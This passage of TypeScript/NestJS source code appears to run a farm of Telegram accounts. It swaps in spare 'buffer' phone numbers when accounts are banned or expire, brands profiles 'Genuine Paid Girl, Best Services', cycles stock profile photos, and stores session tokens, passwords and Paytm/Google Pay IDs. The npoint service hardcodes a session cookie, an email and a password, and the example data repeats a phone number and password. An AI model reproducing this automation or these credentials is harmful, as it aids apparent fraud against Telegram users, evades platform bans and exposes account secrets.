client[key] === query[key]);\n            })\n            : allClients;\n        const results = filteredClients.map(client => {\n            const { session, mobile, password, promoteMobile, ...maskedClient } = client;\n            return maskedClient;\n        });\n        return results;\n    }\n\n    async refreshMap() {\n        console.log(\"Refreshed Clients\")\n        this.clientsMap.clear();\n    }\n\n    async findOne(clientId: string, throwErr: boolean = true): Promise<Client> {\n        const client = this.clientsMap.get(clientId)\n        if (client) {\n            return client;\n        } else {\n            const user = await this.clientModel.findOne({ clientId }, { _id: 0, updatedAt: 0 }).lean().exec();\n            this.clientsMap.set(clientId, user);\n            if (!user && throwErr) {\n                throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n            }\n            return user;\n        }\n    }\n\n    async update(clientId: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto['_id']\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        await fetchWithTimeout(`${notifbot()}&text=Updating the Existing client: ${clientId}`);\n        const updatedUser = await this.clientModel.findOneAndUpdate({ clientId }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        this.clientsMap.set(clientId, updatedUser);\n        await fetchWithTimeout(`${process.env.uptimeChecker}/refreshmap`);\n        await fetchWithTimeout(`${process.env.uptimebot}/refreshmap`);\n        console.log(\"Refreshed Maps\")\n        return updatedUser;\n    }\n\n    async remove(clientId: string): Promise<Client> {\n        const deletedUser = await this.clientModel.findOneAndDelete({ clientId }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${clientId}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.clientModel.find(filter).exec();\n    }\n\n    async setupClient(clientId: string, setupClientQueryDto: SetupClientQueryDto) {\n        console.log(`Received New Client Request for - ${clientId}`, settingupClient)\n        if (toBoolean(process.env.AUTO_CLIENT_SETUP) && Date.now() > (settingupClient + 240000)) {\n            settingupClient = Date.now();\n            const existingClient = await this.findOne(clientId);\n            const existingClientMobile = existingClient.mobile\n            await fetchWithTimeout(`${notifbot()}&text=Received New Client Request for - ${clientId} - OldNumber: ${existingClient.mobile} || ${existingClient.username}`);\n            console.log(setupClientQueryDto);\n            await connectionManager.disconnectAll();\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const query = { availableDate: { $lte: today }, channels: { $gt: 200 } }\n            const newBufferClient = (await this.bufferClientService.executeQuery(query, { tgId: 1 }))[0];\n            try {\n                if (newBufferClient) {\n                    this.telegramService.setActiveClientSetup({ ...setupClientQueryDto, clientId, existingMobile: existingClientMobile, newMobile: newBufferClient.mobile })\n                    await connectionManager.getClient(newBufferClient.mobile);\n                    const newSession = await this.telegramService.createNewSession(newBufferClient.mobile);\n                    await this.updateClientSession(newSession)\n                } else {\n                    await fetchWithTimeout(`${notifbot()}&text=Buffer Clients not available`);\n                    console.log(\"Buffer Clients not available\")\n                }\n\n                // const archivedClient = await this.archivedClientService.findOne(newBufferClient.mobile)\n                // if (archivedClient) {\n                //     await fetchWithTimeout(`${notifbot()}&text=Using Old Session from Archived Clients- NewNumber:${newBufferClient.mobile}`);\n                //     await this.updateClientSession(archivedClient.session)\n                // } else {\n                //     await connectionManager.getClientnewBufferClient.mobile, false, true);\n                //     await this.generateNewSession(newBufferClient.mobile)\n                // }\n            } catch (error) {\n                parseError(error);\n                console.log(\"Removing buffer as error\")\n                const availableDate = (new Date(Date.now() + (3 * 24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n                await this.bufferClientService.createOrUpdate(newBufferClient.mobile, { availableDate });\n                this.telegramService.setActiveClientSetup(undefined)\n            } finally {\n                await connectionManager.unregisterClient(newBufferClient.mobile)\n            }\n        } else {\n            console.log(\"Profile Setup Recently tried, wait ::\", settingupClient - Date.now());\n        }\n    }\n\n    async updateClientSession(newSession: string) {\n        try {\n            let updatedUsername = '';\n            console.log(\"Updating Client Session\");\n            const setup = this.telegramService.getActiveClientSetup();\n            const { days, archiveOld, clientId, existingMobile, formalities, newMobile } = setup;\n            await connectionManager.disconnectAll();\n            await sleep(2000)\n            const client = await this.findOne(clientId);\n            await connectionManager.getClient(newMobile, { handler: true, autoDisconnect: false });\n            const firstName = (client.name).split(' ')[0];\n            const middleName = (client.name).split(' ')[1];\n            const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n            const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n            const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n            try {\n                updatedUsername = await this.telegramService.updateUsername(newMobile, baseUsername);\n            } catch (error) {\n                parseError(error, 'Error in updating username', true);\n            }\n            await fetchWithTimeout(`${notifbot()}&text=Updated username for NewNumber:${newMobile} || ${updatedUsername}`);\n            await connectionManager.unregisterClient(newMobile);\n            const existingClientUser = (await this.usersService.search({ mobile: existingMobile }))[0];\n            const existingClient = await this.findOne(clientId);\n            await this.update(clientId, { mobile: newMobile, username: updatedUsername, session: newSession });\n            await fetchWithTimeout(existingClient.deployKey, {}, 1);\n            await this.bufferClientService.remove(newMobile);\n            setTimeout(async () => {\n                await this.updateClient(clientId);\n            }, 15000);\n\n            try {\n                if (existingClientUser) {\n                    try {\n                        if (toBoolean(formalities)) {\n                            await connectionManager.getClient(existingMobile, { handler: true, autoDisconnect: false });\n                            console.log(\"Started Formalities\");\n                            await this.telegramService.updateNameandBio(existingMobile, 'Deleted Account', `New Acc: @${updatedUsername}`);\n                            await this.telegramService.deleteProfilePhotos(existingMobile)\n                            await this.telegramService.updateUsername(existingMobile, '');\n                            await this.telegramService.updatePrivacyforDeletedAccount(existingMobile);\n                            console.log(\"Formalities finished\");\n                            await connectionManager.unregisterClient(existingMobile);\n                            await fetchWithTimeout(`${notifbot()}&text=Formalities finished`);\n                        } else {\n                            console.log(\"Formalities skipped\")\n                        }\n                        if (archiveOld) {\n                            const availableDate = (new Date(Date.now() + ((days + 1) * 24 * 60 * 60 * 1000))).toISOString().split('T')[0];\n                            const bufferClientDto: CreateBufferClientDto | UpdateBufferClientDto = {\n                                mobile: existingMobile,\n                                availableDate,\n                                session: existingClientUser.session,\n                                tgId: existingClientUser.tgId,\n                                channels: 170\n                            }\n                            const updatedBufferClient = await this.bufferClientService.createOrUpdate(existingMobile, bufferClientDto);\n                            // await this.archivedClientService.update(existingMobile, existingClient);\n                            console.log(\"client Archived: \", updatedBufferClient);\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archived`);\n                        } else {\n                            console.log(\"Client Archive Skipped\")\n                            await fetchWithTimeout(`${notifbot()}&text=Client Archive Skipped`);\n                        }\n                    } catch (error) {\n                        console.log(\"Cannot Archive Old Client\");\n                        const errorDetails = parseError(error, 'Error in Archiving Old Client', true);\n                        if (contains(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', \"session_revoked\", \"user_deactivated_ban\"])) {\n                            console.log(\"Deleting User: \", existingClientUser.mobile);\n                            await this.bufferClientService.remove(existingClientUser.mobile);\n                            await this.archivedClientService.remove(existingClientUser.mobile);\n                        } else {\n                            console.log('Not Deleting user');\n                        }\n                    }\n                }\n            } catch (error) {\n                parseError(error, 'Error in Archiving Old Client outer', true);\n                console.log(\"Error in Archiving Old Client\");\n            }\n            this.telegramService.setActiveClientSetup(undefined);\n            console.log(\"Update finished Exitting Exiiting TG Service\");\n            await fetchWithTimeout(`${notifbot()}&text=Update finished`);\n            await connectionManager.disconnectAll();\n        } catch (e) {\n            parseError(e, 'Error in updating client session', true);\n            this.telegramService.setActiveClientSetup(undefined)\n        }\n    }\n\n    async updateClient(clientId: string) {\n        const now = Date.now();\n        const lastUpdate = this.lastUpdateMap.get(clientId) || 0;\n        const cooldownPeriod = 30000;\n        if (now - lastUpdate < cooldownPeriod) {\n            console.log(`Skipping update for ${clientId} - cooldown period not elapsed. Try again in ${Math.ceil((cooldownPeriod - (now - lastUpdate)) / 1000)} seconds`);\n            return;\n        }\n\n        const client = await this.findOne(clientId);\n        try {\n            this.lastUpdateMap.set(clientId, now);\n            await CloudinaryService.getInstance(client?.dbcoll?.toLowerCase());\n            const telegramClient = await connectionManager.getClient(client.mobile, { handler: false });\n            await sleep(2000)\n            const me = await telegramClient.getMe();\n            if (!me.username || me.username !== client.username || !me.username?.toLowerCase().startsWith(me.firstName.split(' ')[0].toLowerCase())) {\n                const client = await this.findOne(clientId);\n                const firstName = (client.name).split(' ')[0];\n                const middleName = (client.name).split(' ')[1];\n                const firstNameCaps = firstName[0].toUpperCase() + firstName.slice(1);\n                const middleNameCaps = middleName ? middleName[0].toUpperCase() + middleName.slice(1) : '';\n                const baseUsername = `${firstNameCaps}_${middleNameCaps.slice(0, 3)}` + fetchNumbersFromString(clientId);\n                const updatedUsername = await telegramClient.updateUsername(baseUsername);\n                await this.update(client.clientId, { username: updatedUsername })\n            }\n            await sleep(1000)\n            if (me.firstName !== client.name) {\n                await telegramClient.updateProfile(client.name, \"Genuine Paid Girl, Best Services\");\n            }\n            await sleep(1000)\n            await telegramClient.deleteProfilePhotos();\n            await sleep(1000)\n            await telegramClient.updatePrivacy();\n            await sleep(1000)\n            const rootPath = process.cwd();\n            console.log(rootPath, \"trying to update dp\");\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));\n            await sleep(1000);\n            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));\n            await sleep(1000);\n        } catch (error) {\n            this.lastUpdateMap.delete(clientId);\n            parseError(error)\n        } finally {\n            connectionManager.unregisterClient(client.mobile);\n        }\n    }\n\n    async updateClients() {\n        const clients = await this.findAll();\n        for (const client of clients) {\n            await this.updateClient(client.clientId)\n        }\n    }\n\n    async generateNewSession(phoneNumber: string, attempt: number = 1) {\n        try {\n            console.log(\"String Generation started\");\n            await fetchWithTimeout(`${notifbot()}&text=String Generation started for NewNumber:${phoneNumber}`);\n            await sleep(1000);\n            const response = await fetchWithTimeout(`${process.env.uptimebot}/login?phone=${phoneNumber}&force=${true}`, { timeout: 15000 }, 1);\n            if (response) {\n                console.log(`Code Sent successfully`, response.data);\n                await fetchWithTimeout(`${notifbot()}&text=Code Sent successfully`);\n                await this.bufferClientService.update(phoneNumber, { availableDate: (new Date(Date.now() + (24 * 60 * 60 * 1000))).toISOString().split('T')[0] })\n            } else {\n                await fetchWithTimeout(`${notifbot()}&text=Failed to send Code`);\n                console.log(\"Failed to send Code\", response);\n                if (attempt < 2) {\n                    await sleep(8000);\n                    await this.generateNewSession(phoneNumber, attempt + 1);\n                }\n            }\n        } catch (error) {\n            console.log(error);\n            if (attempt < 2) {\n                await sleep(8000);\n                await this.generateNewSession(phoneNumber, attempt + 1);\n            }\n        }\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<Client[]> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.clientModel.find(query);\n\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    async addPromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $addToSet: { promoteMobile: mobileNumber } }, // Add only if it doesn't already exist\n            { new: true } // Return the updated document\n        ).exec();\n    }\n\n    async removePromoteMobile(clientId: string, mobileNumber: string): Promise<Client> {\n        return this.clientModel.findOneAndUpdate(\n            { clientId }, // Filter by clientId\n            { $pull: { promoteMobile: mobileNumber } }, // Remove the specified number\n            { new: true } // Return the updated document\n        ).exec();\n    }\n}\n","import { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateClientDto {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    readonly channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    readonly dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    readonly link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    readonly name: string;\n\n    @ApiProperty({ example: '+916265240911', description: 'Phone number of the user' })\n    readonly mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    readonly password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    readonly repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    readonly promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuMTA4LjUg==', description: 'Session token' })\n    readonly session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    readonly username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    readonly clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    readonly deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    readonly mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    readonly product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user', required: false, type: [String] })\n    readonly promoteMobile: string[];\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user', required: false })\n    readonly qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user', required: false })\n    readonly gpayId: string;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { Transform, TransformFnParams } from 'class-transformer';\nimport { IsOptional, IsString, IsArray, IsUrl, Matches, ArrayNotEmpty } from 'class-validator';\n\nexport class SearchClientDto {\n    @ApiPropertyOptional({ description: 'Client ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    @Matches(/^[a-z0-9_-]{3,50}$/i, { message: 'Invalid client ID format' })\n    clientId?: string;\n\n    @ApiPropertyOptional({ description: 'Database collection name' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    dbcoll?: string;\n\n    @ApiPropertyOptional({ description: 'Channel link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    channelLink?: string;\n\n    @ApiPropertyOptional({ description: 'Link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    link?: string;\n\n    @ApiPropertyOptional({ description: 'Name of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    name?: string;\n\n    @ApiPropertyOptional({ description: 'Phone number of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @Matches(/^\\+?[0-9]{10,15}$/, { message: 'Invalid phone number format' })\n    number?: string;\n\n    @ApiPropertyOptional({ description: 'Password of the client' })\n    @IsOptional()\n    @IsString()\n    password?: string;\n\n    @ApiPropertyOptional({ description: 'Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    repl?: string;\n\n    @ApiPropertyOptional({ description: 'Promotion Repl link of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    promoteRepl?: string;\n\n    @ApiPropertyOptional({ description: 'Clientname of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    clientName?: string;\n\n    @ApiPropertyOptional({ description: 'Deployment key URL' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsUrl({}, { message: 'Invalid URL format' })\n    deployKey?: string;\n\n    @ApiPropertyOptional({ description: 'Main account of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim().toLowerCase())\n    @IsOptional()\n    @IsString()\n    mainAccount?: string;\n\n    @ApiPropertyOptional({ description: 'Product associated with the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    product?: string;\n\n    @ApiPropertyOptional({ description: 'Promote mobile numbers of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.map((v: string) => v?.trim()))\n    @IsOptional()\n    @IsArray()\n    @ArrayNotEmpty({ message: 'Promote mobile numbers must not be empty if provided' })\n    @Matches(/^\\+?[0-9]{10,15}$/, { each: true, message: 'Invalid phone number format in promoteMobile' })\n    promoteMobile?: string[];\n\n    @ApiPropertyOptional({ description: 'Paytm QR ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    qrId?: string;\n\n    @ApiPropertyOptional({ description: 'Google Pay ID of the client' })\n    @Transform(({ value }: TransformFnParams) => value?.trim())\n    @IsOptional()\n    @IsString()\n    gpayId?: string;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateClientDto } from './create-client.dto';\n\nexport class UpdateClientDto extends PartialType(CreateClientDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type ClientDocument = Client & Document;\n\n@Schema({\n    collection: 'clients', versionKey: false, autoIndex: true, timestamps: true,\n    toJSON: {\n        virtuals: true,\n        transform: (doc, ret) => {\n            delete ret._id;\n        },\n    },\n})\nexport class Client {\n    @ApiProperty({ example: 'paid_giirl_shruthiee', description: 'Channel link of the user' })\n    @Prop({ required: true })\n    channelLink: string;\n\n    @ApiProperty({ example: 'shruthi', description: 'Database collection name' })\n    @Prop({ required: true })\n    dbcoll: string;\n\n    @ApiProperty({ example: 'PaidGirl.netlify.app/Shruthi1', description: 'Link of the user' })\n    @Prop({ required: true })\n    link: string;\n\n    @ApiProperty({ example: 'Shruthi Reddy', description: 'Name of the user' })\n    @Prop({ required: true })\n    name: string;\n\n    @ApiProperty({ example: '916265240911', description: 'mobile number of the user' })\n    @Prop({ required: true })\n    mobile: string;\n\n    @ApiProperty({ example: 'Ajtdmwajt1@', description: 'Password of the user' })\n    @Prop({ required: true })\n    password: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me', description: 'Repl link of the user' })\n    @Prop({ required: true })\n    repl: string;\n\n    @ApiProperty({ example: 'https://shruthiprom0101.glitch.me', description: 'Promotion Repl link of the user' })\n    @Prop({ required: true })\n    promoteRepl: string;\n\n    @ApiProperty({ example: '1BQANOTEuM==', description: 'Session token' })\n    @Prop({ required: true })\n    session: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Username of the user' })\n    @Prop({ required: true })\n    username: string;\n\n    @ApiProperty({ example: 'shruthi1', description: 'Client ID of the user' })\n    @Prop({ required: true })\n    clientId: string;\n\n    @ApiProperty({ example: 'https://shruthi1.glitch.me/exit', description: 'Deployment key URL' })\n    @Prop({ required: true })\n    deployKey: string;\n\n    @ApiProperty({ example: 'ShruthiRedd2', description: 'Main account of the user' })\n    @Prop({ required: true })\n    mainAccount: string;\n\n    @ApiProperty({ example: 'booklet_10', description: 'Product associated with the user' })\n    @Prop({ required: true })\n    product: string;\n\n    @ApiProperty({ example: ['916265240911'], description: 'Promote mobile number of the user' })\n    @Prop({ required: true, type: [String] })\n    promoteMobile: string[];\n\n    @ApiProperty({ example: 'paytmqr281005050101xv6mfg02t4m9@paytm', description: 'Paytm QR ID of the user' })\n    @Prop({ required: true })\n    qrId: string;\n\n    @ApiProperty({ example: 'myred1808@postbank', description: 'Google Pay ID of the user' })\n    @Prop({ required: true })\n    gpayId: string;\n}\n\nexport const ClientSchema = SchemaFactory.createForClass(Client);\n","import {\n    Controller,\n    Get,\n    Post,\n    Put,\n    Param,\n    Body,\n    HttpException,\n    HttpStatus,\n  } from '@nestjs/common';\n  import { NpointService } from './npoint.service';\n  import {\n    ApiTags,\n    ApiOperation,\n    ApiParam,\n    ApiBody,\n    ApiResponse,\n  } from '@nestjs/swagger';\n  \n  @ApiTags('NPoint API') // Group endpoints under \"NPoint API\" in Swagger UI\n  @Controller('npoint')\n  export class NpointController {\n    constructor(private readonly npointService: NpointService) {}\n  \n    @Get('documents/:id')\n    @ApiOperation({ summary: 'Fetch a document by ID' }) // Description of the endpoint\n    @ApiParam({ name: 'id', description: 'The ID of the document to fetch' }) // Document the parameter\n    @ApiResponse({\n      status: 200,\n      description: 'Document fetched successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async fetchDocument(@Param('id') id: string) {\n      try {\n        return await this.npointService.fetchDocument(id);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  \n    @Post('documents')\n    @ApiOperation({ summary: 'Post a new document' })\n    @ApiBody({\n      description: 'The document to post',\n      schema: {\n        example: {\n          title: 'My Document',\n          content: 'This is the content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 201,\n      description: 'Document posted successfully',\n    })\n    @ApiResponse({ status: 400, description: 'Invalid input' })\n    async postDocument(@Body() document: any) {\n      try {\n        return await this.npointService.postDocument(document);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.BAD_REQUEST);\n      }\n    }\n\n    @Get('documents')\n    @ApiOperation({ summary: 'Fetch all documents' })\n    @ApiResponse({\n      status: 200,\n      description: 'List of all documents fetched successfully',\n    })\n    @ApiResponse({ status: 500, description: 'Internal server error' })\n    async fetchAllDocuments() {\n      try {\n        return await this.npointService.fetchAllDocuments();\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.INTERNAL_SERVER_ERROR);\n      }\n    }  \n  \n    @Put('documents/:id')\n    @ApiOperation({ summary: 'Update a document by ID' })\n    @ApiParam({ name: 'id', description: 'The ID of the document to update' })\n    @ApiBody({\n      description: 'The updated document',\n      schema: {\n        example: {\n          title: 'Updated Document',\n          content: 'This is the updated content of the document.',\n        },\n      },\n    })\n    @ApiResponse({\n      status: 200,\n      description: 'Document updated successfully',\n    })\n    @ApiResponse({ status: 404, description: 'Document not found' })\n    async updateDocument(@Param('id') id: string, @Body() updatedDocument: any) {\n      try {\n        return await this.npointService.updateDocument(id, updatedDocument);\n      } catch (error) {\n        throw new HttpException(error.message, HttpStatus.NOT_FOUND);\n      }\n    }\n  }","import { Module } from '@nestjs/common';\nimport { NpointService } from './npoint.service';\nimport { NpointController } from './npoint.controller';\n\n@Module({\n  controllers: [NpointController],\n  providers: [NpointService],\n  exports: [NpointService]\n})\nexport class NpointModule {}","import { Injectable, Logger } from '@nestjs/common';\nimport axios from 'axios';\n\n@Injectable()\nexport class NpointService {\n    private readonly logger = new Logger(NpointService.name);\n    private csrfToken: string | null = null;\n    private cookie: string | null = '_npoint_session=MTBOeElFZ0pXV0oxTm9xd1dQQ0tNYnhVYWg1blFCMUVtUUJVWFQ1cGZwdlNwSTdacjBVTStJbDlHaGlWd0pGUDRzUmRaYnZNQVNTMTVmY1R6dEVUd0RPMXVFcmE1cnFYY09qd1A5TFpNVnZOUnVJRnlWV3ZtODk0ajlQVXQ0QzQ0MUtGeU5mTTB5dGFPNCtLUW9tVy9yTmFRZzlRQUdRK0NkQVVtZGxtMVEySzN0TC9sUjdMR2RjVW5xTmtleWw4TWdPOVNMa2JaZEs1c1o3eGE3UHdsQ2JiTEdQbHhUaysraCsrcG9LM25YREdyTDdpYWlHQ0wraEhNV3NXbzJtK1YvVzEvVTh2Z0N5bnpzU1hqcndiM041L2I3R29UMDY3RitBYkxvTktWaUVmdTg4SGJORjRTS25uZ2JDSWhmNWFoem0vNGNvUnAzMDBsQ0FJcUZTMjdnPT0tLWs2a2x2SUZqcHhDN1A0eFdUaWhBeVE9PQ%3D%3D--4d0883b9956c6d2744389228dab7321ff2eb88e5';\n    private readonly baseUrl = 'https://www.npoint.io'; // Replace with your API base URL\n    private readonly signInUrl = 'https://www.npoint.io/users/sign_in'; // Replace with your sign-in API URL\n\n    // Method to fetch CSRF token from the sign-in API\n    private async fetchCsrfToken(): Promise<string> {\n        this.logger.debug('Fetching CSRF token...');\n        try {\n            let data = JSON.stringify({\n                \"user\": {\n                    \"email\": \"dodieajt@gmail.com\",\n                    \"password\": \"Ajtdmwajt1@\"\n                }\n            });\n\n            let config = {\n                method: 'post',\n                maxBodyLength: Infinity,\n                url: this.signInUrl,\n                headers: {\n                    'Content-Type': 'application/json',\n                    'Cookie': this.cookie\n                },\n                data: data\n            };\n\n            const response = await axios.request(config)\n            console.log(\"Cookie:\", response.headers['set-cookie'][0]);\n            this.cookie = response.headers['set-cookie'][0];\n            // Extract CSRF token from the response (adjust based on your API response structure)\n            this.csrfToken = await this.fetchCsrfTokenFromHtml(response.data);\n\n            if (!this.csrfToken) {\n                throw new Error('CSRF token not found in the sign-in response.');\n            }\n\n            this.logger.debug('CSRF token fetched successfully.');\n            return this.csrfToken;\n        } catch (error) {\n            this.logger.error(`Failed to fetch CSRF token: ${error.message}`);\n            throw new Error(`Failed to fetch CSRF token: ${error.message}`);\n        }\n    }\n\n    // Method to ensure CSRF token is available\n    private async ensureCsrfToken(): Promise<void> {\n        if (!this.csrfToken) {\n            await this.fetchCsrfToken();\n        }\n    }\n\n    // Method to fetch a document\n    async fetchDocument(documentId: string): Promise<any> {\n        this.logger.debug(`Fetching document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents/${documentId}`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document with ID: ${documentId} fetched successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to fetch document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to fetch document: ${error.message}`);\n        }\n    }\n\n    // Method to post a document\n    async postDocument(document: any): Promise<any> {\n        this.logger.debug('Posting a new document...');\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.post(`${this.baseUrl}/documents`, { \"generate_contents\": true }, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            this.logger.debug(`Document posted successfully. Updating document with token: ${response.data.token}`);\n            await this.updateDocument(response.data.token, document);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to post document: ${error.message}`);\n            throw new Error(`Failed to post document: ${error.message}`);\n        }\n    }\n\n    // Method to update a document\n    async updateDocument(documentId: string, updatedDocument: any): Promise<any> {\n        this.logger.debug(`Updating document with ID: ${documentId}`);\n        await this.ensureCsrfToken();\n\n        // const oldDocument = (await axios.get(`https://api.npoint.io/${documentId}`)).data;\n        const body =\n        {\n            \"contents\": JSON.stringify(updatedDocument),\n            \"original_contents\": JSON.stringify(updatedDocument),\n            \"schema\": null,\n            \"original_schema\": \"\"\n        }\n\n        try {\n            const response = await axios.put(\n                `${this.baseUrl}/documents/${documentId}`,\n                body,\n                {\n                    headers: {\n                        'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                        'Cookie': this.cookie\n                    },\n                },\n            );\n\n            this.logger.debug(`Document with ID: ${documentId} updated successfully.`);\n            return response.data;\n        } catch (error) {\n            this.logger.error(`Failed to update document with ID: ${documentId}: ${error.message}`);\n            throw new Error(`Failed to update document: ${error.message}`);\n        }\n    }\n\n    async fetchAllDocuments(): Promise<any[]> {\n        await this.ensureCsrfToken();\n\n        try {\n            const response = await axios.get(`${this.baseUrl}/documents`, {\n                headers: {\n                    'X-CSRF-Token': this.csrfToken, // Include CSRF token in the headers\n                    'Cookie': this.cookie\n                },\n            });\n\n            return response.data;\n        } catch (error) {\n            throw new Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n  